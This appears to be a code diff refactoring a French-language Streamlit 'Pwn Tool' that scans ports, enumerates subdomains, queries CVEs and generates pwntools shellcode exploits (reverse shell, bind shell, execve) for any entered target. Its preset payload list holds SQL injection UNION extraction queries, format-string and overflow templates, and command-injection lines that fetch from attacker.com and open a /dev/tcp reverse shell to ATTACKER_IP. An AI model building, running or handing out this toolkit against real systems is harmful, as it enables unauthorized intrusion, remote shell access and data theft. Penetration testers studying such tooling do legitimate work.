@@ -1,23 +1,18 @@
 import streamlit as st
+
+# Must be the first Streamlit command
+st.set_page_config(
+    page_title="Pwn Tool",
+    page_icon="🔥",
+    layout="wide", 
+    initial_sidebar_state="expanded"
+)
+
+# Import modules before any other Streamlit commands
 import sys
 import os
 from datetime import datetime
 from dotenv import load_dotenv
-
-# Import pwntools avec gestion des erreurs
-try:
-    from pwn import *
-    from pwnlib import context, shellcraft
-    from pwnlib.asm import asm
-    context.clear()  # Réinitialiser le contexte
-    context.update(arch='amd64', os='linux', log_level='debug')
-except ImportError:
-    st.error("❌ Erreur: pwntools n'est pas installé. Exécutez 'pip install pwntools'")
-    sys.exit(1)
-except Exception as e:
-    st.error(f"❌ Erreur d'initialisation pwntools: {str(e)}")
-    sys.exit(1)
-
 import socket
 import requests
 import re
@@ -25,30 +20,47 @@ from concurrent.futures import ThreadPoolExecutor
 from googletrans import Translator
 import streamlit.runtime.scriptrunner.script_runner as script_runner
 
-# Script runner context fix
-if not hasattr(script_runner, 'get_script_run_ctx'):
-    def get_script_run_ctx(): return None
-    script_runner.get_script_run_ctx = get_script_run_ctx
+# Initialize pwntools context
+PWNTOOLS_ERROR = None
+try:
+    from pwn import *
+    from pwnlib.context import context as pwncontext
+    CONTEXT = pwncontext
+    CONTEXT.arch = 'amd64'
+    CONTEXT.os = 'linux'
+    CONTEXT.log_level = 'debug'
+except Exception as e:
+    CONTEXT = None
+    PWNTOOLS_ERROR = str(e)
+
+def show_pwntools_error():
+    """Affiche l'erreur d'initialisation de pwntools si elle existe"""
+    if PWNTOOLS_ERROR:
+        st.error(f"❌ Erreur d'initialisation pwntools: {PWNTOOLS_ERROR}")
+
+# Initialize context management functions
+def init_context(arch='amd64', os='linux', log_level='debug'):
+    """Initialise le contexte pwntools de manière sécurisée"""
+    try:
+        if CONTEXT:
+            CONTEXT.arch = arch
+            CONTEXT.os = os
+            CONTEXT.log_level = log_level
+            return True
+        return False
+    except Exception as e:
+        st.error(f"❌ Erreur d'initialisation du contexte: {str(e)}")
+        return False
 
 # Initialize session state
 if 'session_state' not in st.session_state:
     st.session_state['session_state'] = {
         'analysis_results': None,
         'selected_payload': None,
-        'custom_payload': None
+        'custom_payload': None,
     }
 
-# Page config
-if __name__ == "__main__":
-    st.set_page_config(
-        page_title="Pwn Tool",
-        page_icon="🔥",
-        layout="wide",
-        initial_sidebar_state="expanded",
-    )
-
 # Supprimer tout code existant lié à la sélection de langue
-
 # Définir une seule fois le sélecteur de langue
 def create_language_selector():
     lang_col1, lang_col2 = st.columns([6, 1])
@@ -129,10 +141,8 @@ def service_detection(host, port):
         3389: "RDP",
         8080: "HTTP-Proxy"
     }
-    
     banner = get_service_banner(host, port)
     service = common_ports.get(port, "Unknown")
-    
     if banner:
         return f"Port {port} ({service}): {banner}"
     return f"Port {port} ({service}): Ouvert"
@@ -147,7 +157,6 @@ def auto_enum(target):
             from urllib.parse import urlparse
             parsed = urlparse(target)
             domain = parsed.netloc
-            
         results.append(f"🔍 Démarrage de l'analyse pour: {target}")
         
         # Énumération des sous-domaines
@@ -158,18 +167,16 @@ def auto_enum(target):
         # Scan des ports
         results.append("\n🔍 Scan des ports...")
         common_ports = [21, 22, 23, 25, 80, 443, 445, 3306, 3389, 8080]
-        
         with st.spinner(f"Scan des ports en cours..."):
             with ThreadPoolExecutor(max_workers=10) as executor:
                 open_ports = list(filter(None, executor.map(
                     lambda p: scan_port(target, p), common_ports
                 )))
-
         if not open_ports:
             results.append("ℹ️ Aucun port ouvert trouvé")
         else:
             results.append(f"✅ Ports ouverts trouvés: {open_ports}")
-
+        
         # Détection de version avec nmap si des ports sont ouverts
         if open_ports:
             results.append("\n🔍 Analyse des services en cours...")
@@ -179,10 +186,8 @@ def auto_enum(target):
                     results.append(service_info)
                 except Exception as e:
                     results.append(f"⚠️ Erreur sur port {port}: {str(e)}")
-
     except Exception as e:
         results.append(f"❌ Erreur: {str(e)}")
-    
     return "\n".join(results)
 
 # Ajoutez cette fonction pour la traduction
@@ -197,7 +202,6 @@ def search_cves(service_info):
     """Recherche les CVE associées aux services détectés via NVD API"""
     cve_results = []
     cve_results.append("🔍 Démarrage de la recherche de vulnérabilités via NVD...")
-    
     try:
         for line in service_info.split('\n'):
             if 'Port' in line:
@@ -206,7 +210,6 @@ def search_cves(service_info):
                     port = service_match.group(1)
                     service = service_match.group(2)
                     version_info = service_match.group(3).strip()
-                    
                     cve_results.append(f"\n📌 Analyse du service: {service} (Port {port})")
                     
                     # Construction de la requête NVD
@@ -215,13 +218,11 @@ def search_cves(service_info):
                         "keywordSearch": f"{service}",
                         "resultsPerPage": 5
                     }
-                    
                     try:
                         response = requests.get(base_url, params=params, timeout=10)
                         if response.status_code == 200:
                             data = response.json()
                             vulns = data.get('vulnerabilities', [])
-                            
                             if not vulns:
                                 cve_results.append(f"✅ Aucune vulnérabilité connue pour {service}")
                             else:
@@ -250,13 +251,10 @@ def search_cves(service_info):
                                     )
                         else:
                             cve_results.append(f"⚠️ Erreur API NVD: {response.status_code}")
-                            
                     except requests.exceptions.RequestException as e:
                         cve_results.append(f"⚠️ Erreur réseau: {str(e)}")
                         continue
-                        
         return "\n".join(cve_results)
-        
     except Exception as e:
         return f"❌ Erreur globale: {str(e)}\n💡 Conseil: Vérifiez votre connexion Internet"
 
@@ -265,7 +263,7 @@ def load_subdomain_list():
     try:
         url = "https://raw.githubusercontent.com/rbsec/dnscan/master/subdomains-10000.txt"
         response = requests.get(url)
-        if response.status_code == 200:
+        if (response.status_code == 200):
             return [line.strip() for line in response.text.splitlines() if line.strip()]
         return []
     except Exception as e:
@@ -277,18 +275,15 @@ def enumerate_subdomains(domain):
     subdomains = []
     found_count = 0
     max_subdomains = 100  # Limite pour éviter une énumération trop longue
-    
     try:
         # Charger la liste complète des sous-domains
         subdomain_list = load_subdomain_list()
         total = len(subdomain_list)
-        
         with st.progress(0) as progress_bar:
             for i, sub in enumerate(subdomain_list):
                 if found_count >= max_subdomains:
                     subdomains.append(f"⚠️ Limite de {max_subdomains} sous-domaines atteinte")
                     break
-                    
                 subdomain = f"{sub}.{domain}"
                 try:
                     ip = socket.gethostbyname(subdomain)
@@ -298,23 +293,18 @@ def enumerate_subdomains(domain):
                     continue
                 except Exception as e:
                     subdomains.append(f"❌ Erreur pour {subdomain}: {str(e)}")
-                
                 # Mise à jour de la barre de progression
                 progress_bar.progress((i + 1) / total)
-        
         if not subdomains:
             return "Aucun sous-domaine trouvé"
-        
         summary = f"""
 🔍 Résultats de l'énumération des sous-domaines pour {domain}:
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ✓ Sous-domaines trouvés: {found_count}
 ✓ Sous-domaines testés: {total}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
 """
         return summary + "\n".join(subdomains)
-        
     except Exception as e:
         return f"❌ Erreur lors de l'énumération: {str(e)}"
 
@@ -378,7 +368,7 @@ texts = {
         "architecture": "Architecture",
         "shellcode": "Shellcode Type",
         "port": "Custom Port",
-        "payload": "Custom Payload (hex or asm)",
+        "payload": "Custom Payload (hex ou asm)",
         "presets": "Preset Payloads",
         "generate": "⚡ Generate Exploit",
         "download": "📥 Download Report",
@@ -398,38 +388,33 @@ if st.button(texts[current_lang]["analyze"]):
         with st.spinner("Analyse en cours..."):
             # Analyse automatique
             analysis_results = auto_enum(target)
-            
             # Afficher les résultats de l'énumération
             st.subheader("🔍 Résultats de l'énumération")
             st.code(analysis_results, language="text")
-            
             # Rechercher et afficher les CVE
             st.subheader("🎯 Vulnérabilités potentielles (CVE)")
             with st.spinner("Recherche des CVE..."):
                 cve_results = search_cves(analysis_results)
                 st.code(cve_results, language="text")
-            
             # Préparer le rapport complet
             full_report = f"""RAPPORT D'ANALYSE
 ============================
 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 ============================
-
 ÉNUMÉRATION
 -----------
 {analysis_results}
 
 VULNÉRABILITÉS POTENTIELLES
---------------------------
+---------------------------
 {cve_results}
 """
-            
             # Bouton de téléchargement
             st.download_button(
                 label=texts[current_lang]["download"],
                 data=full_report,
                 file_name=f"pentest_report_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
-                mime="text/plain"
+                mime="text/plain",
             )
 
 # Après le bouton d'analyse existant
@@ -444,30 +429,25 @@ if st.button(texts[current_lang]["subdomain_scan"], key="subdomain_scan_button")
 # Options avancées dans un expander
 with st.expander(texts[current_lang]["advanced"]):
     col1, col2 = st.columns(2)
-    
     with col1:
         # Sélection de l'architecture
         selected_arch = st.selectbox(
             texts[current_lang]["architecture"],
-            ['amd64', 'i386', 'arm', 'aarch64']
+            ['amd64', 'i386', 'arm', 'aarch64'],
         )
         # Mise à jour du contexte après la sélection
         try:
             context.arch = selected_arch
         except Exception as e:
             st.error(f"❌ Erreur lors du changement d'architecture: {str(e)}")
-        
         shellcode_type = st.selectbox(
             texts[current_lang]["shellcode"],
             ['shell_bind_tcp', 'shell_reverse_tcp', 'execve']
         )
-    
     with col2:
         custom_port = st.number_input(texts[current_lang]["port"], min_value=1, max_value=65535, value=4444)
-        
         # Création de deux colonnes pour le payload
         payload_col1, payload_col2 = st.columns([3, 1])
-        
         # Définition du dictionnaire de payloads avant le selectbox
         payload_dict = {
             "Sélectionner...": {
@@ -477,7 +457,6 @@ with st.expander(texts[current_lang]["advanced"]):
             "Linux x64 - Bind Shell": {
                 "code": """# 1. Générez le shellcode
 shellcode = asm(shellcraft.amd64.linux.bindsh(4444))
-
 # 2. Lancez un listener sur la machine cible (port 4444)
 # 3. Connectez-vous avec : nc <target_ip> 4444""",
                 "description": "Ouvre un shell sur le port 4444"
@@ -485,15 +464,13 @@ shellcode = asm(shellcraft.amd64.linux.bindsh(4444))
             "Linux x64 - Reverse Shell": {
                 "code": """# 1. Lancez un listener sur votre machine
 # nc -lvnp 4444
-
 # 2. Remplacez ATTACKER_IP par votre IP
 shellcode = asm(shellcraft.amd64.linux.connectback('ATTACKER_IP', 4444))""",
-                "description": "Se connecte à l'attaquant sur le port 4444"
+                "description": "Se connecte à l'attaquant sur le port 4444",
             },
             "Linux x64 - Execute /bin/sh": {
                 "code": """# 1. Générez le shellcode
 shellcode = asm(shellcraft.amd64.linux.sh())
-
 # 2. Pour exécuter directement:
 # p = process('./binary')
 # p.sendline(shellcode)
@@ -503,11 +480,9 @@ shellcode = asm(shellcraft.amd64.linux.sh())
             "Format String - Stack Leak": {
                 "code": """# 1. Envoyez le payload pour fuiter la pile
 payload = b'%x.' * 20
-
 # 2. Pour analyser la réponse:
 # response = p.recvline()
 # print(response.decode())
-
 # 3. Pour trouver des adresses spécifiques:
 # memory_leak = response.split(b'.')[offset]""",
                 "description": "Fuite de la pile"
@@ -515,19 +490,16 @@ payload = b'%x.' * 20
             "Format String - Memory Write": {
                 "code": """# 1. Calculez l'offset de votre cible
 payload = b'AAAA' + b'%x ' * 10
-
 # 2. Écrivez à l'adresse cible
 target_addr = 0x0804xxxx
 write_payload = fmtstr_payload(offset, {target_addr: desired_value})""",
-                "description": "Écriture en mémoire via format string"
+                "description": "Écriture en mémoire via format string",
             },
             "Buffer Overflow - Pattern": {
                 "code": """# 1. Créez un pattern unique
 pattern = cyclic(1000)
-
 # 2. Trouvez l'offset après crash
 # offset = cyclic_find(0x6161616161)
-
 # 3. Construisez votre payload
 # payload = flat(
 # )""",
@@ -536,7 +508,6 @@ pattern = cyclic(1000)
             "SQL Injection - Basic": {
                 "code": """# 1. Test d'authentification basique
 payload = "' OR '1'='1"
-
 # 2. Variantes utiles:
 # admin' --
 # ' OR 1=1 --
@@ -552,24 +523,19 @@ def detect_columns(url, max_columns=10):
         if "error" in response.text.lower():
             return i - 1
     return max_columns
-
 # 2. Test des colonnes exploitables
 def test_columns(url, num_columns):
     nulls = ','.join(['NULL'] * num_columns)
     payload = f"' UNION SELECT {nulls}-- -"
     return requests.get(url + payload)
-
 # 3. Extraction d'informations
 def extract_info(url):
     # Tables
     tables_payload = "' UNION SELECT GROUP_CONCAT(table_schema,'.',table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -"
-    
     # Colonnes (utiliser des requêtes préparées en production)
     def get_columns(table):
         return f"' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='{table}'-- -"
-    
     return tables_payload, get_columns
-
 # 4. Protection contre les injections
 def secure_query(cursor, query, params):
     try:
@@ -583,7 +549,6 @@ def secure_query(cursor, query, params):
             "Command Injection - Basic": {
                 "code": """# 1. Test d'injection simple
 payload = "$(id)"
-
 # 2. Variantes utiles:
 # ;id
 # |id
@@ -594,24 +559,20 @@ payload = "$(id)"
             "Command Injection - Advanced": {
                 "code": """# 1. Encodage base64 pour bypass
 payload = "`whoami`|base64"
-
 # 2. Autres techniques de bypass:
 # $(curl http://attacker.com/$(whoami))
 # $(echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64 -d | bash)""",
-                "description": "Injection de commande avec encodage"
+                "description": "Injection de commande avec encodage",
             }
         }
-
         with payload_col2:
             preset_payload = st.selectbox(
                 texts[current_lang]["presets"],
                 list(payload_dict.keys())
             )
-            
             # Affichage de la description
             if preset_payload != "Sélectionner...":
                 st.info(f"📝 {payload_dict[preset_payload]['description']}")
-        
         with payload_col1:
             # Utilisation de st.text_area avec value pré-remplie
             custom_payload = st.text_area(
@@ -625,44 +586,25 @@ def validate_input(target, port, shellcode_type):
     if not target:
         st.error("❌ La cible est requise")
         return False
-        
     if not 1 <= port <= 65535:
         st.error("❌ Le port doit être entre 1 et 65535")
         return False
-        
     if shellcode_type not in ['shell_bind_tcp', 'shell_reverse_tcp', 'execve']:
         st.error("❌ Type de shellcode non valide")
         return False
-        
     return True
 
-def init_context(arch='amd64', os='linux', log_level='debug'):
-    """Initialise le contexte pwntools de manière sécurisée"""
-    try:
-        context.clear()
-        context.update(
-            arch=arch,
-            os=os,
-            log_level=log_level
-        )
-        return True
-    except Exception as e:
-        st.error(f"❌ Erreur d'initialisation du contexte: {str(e)}")
-        return False
-
-# Correction de l'erreur de return et du contexte Streamlit
-
-# 1. Déplacer la logique de génération d'exploit dans une fonction
 def generate_exploit(shellcode_type, target, custom_port, selected_arch):
     """Génère un exploit selon les paramètres choisis"""
     try:
         # Configuration du contexte
-        init_context(arch=selected_arch)
-        
-        # Génération du shellcode selon le type
+        if not init_context(arch=selected_arch):
+            raise Exception("Erreur d'initialisation du contexte")
+            
+        # Génération du shellcode
         if shellcode_type == 'shell_reverse_tcp':
             shellcode = asm(shellcraft.linux.connectback(target, custom_port))
-        elif shellcode_type == 'shell_bind_tcp': 
+        elif shellcode_type == 'shell_bind_tcp':
             shellcode = asm(shellcraft.linux.bindsh(custom_port))
         elif shellcode_type == 'execve':
             shellcode = asm(shellcraft.linux.sh())
@@ -674,7 +616,8 @@ def generate_exploit(shellcode_type, target, custom_port, selected_arch):
 from pwn import *
 
 # Configuration
-context.update(arch='{selected_arch}', os='linux')
+context.arch = '{selected_arch}'
+context.os = 'linux'
 
 def exploit():
     try:
@@ -711,7 +654,7 @@ if st.button(texts[current_lang]["generate"]):
             with st.spinner("Génération de l'exploit..."):
                 exploit = generate_exploit(
                     shellcode_type=shellcode_type,
-                    target=target, 
+                    target=target,
                     custom_port=custom_port,
                     selected_arch=selected_arch
                 )
@@ -720,19 +663,17 @@ if st.button(texts[current_lang]["generate"]):
                     label="📥 Télécharger l'exploit",
                     data=exploit,
                     file_name=f"exploit_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py",
-                    mime="text/plain"
+                    mime="text/plain",
                 )
         except Exception as e:
             st.error(f"❌ Erreur de génération: {str(e)}")
 
 # Affichage des informations de débogage
-if context.log_level == 'debug':
+if CONTEXT and CONTEXT.log_level == 'debug':
     with st.expander("🔍 Informations de Débogage"):
         st.code(f"""
-Architecture: {context.arch}
-Endianness: {context.endian}
-OS: {context.os}
-Bits: {context.bits}
+Architecture: {CONTEXT.arch}
+OS: {CONTEXT.os}
 """, language="text")
 
 # Conseils et avertissements
@@ -757,32 +698,5 @@ st.markdown(
     "N'oubliez pas que vous devez utiliser [r](http://_vscodecontentref_/2) pour faire référence à la connexion établie avec la cible."
 )
 
-def validate_input(target, port, shellcode_type):
-    """Valide les paramètres d'entrée"""
-    if not target:
-        st.error("❌ La cible est requise")
-        return False
-        
-    if not 1 <= port <= 65535:
-        st.error("❌ Le port doit être entre 1 et 65535")
-        return False
-        
-    if shellcode_type not in ['shell_bind_tcp', 'shell_reverse_tcp', 'execve']:
-        st.error("❌ Type de shellcode non valide")
-        return False
-        
-    return True
-
-def init_context(arch='amd64', os='linux', log_level='debug'):
-    """Initialise le contexte pwntools de manière sécurisée"""
-    try:
-        context.clear()
-        context.update(
-            arch=arch,
-            os=os,
-            log_level=log_level
-        )
-        return True
-    except Exception as e:
-        st.error(f"❌ Erreur d'initialisation du contexte: {str(e)}")
-        return False
+# Show pwntools error if any (after UI elements are initialized)
+show_pwntools_error()
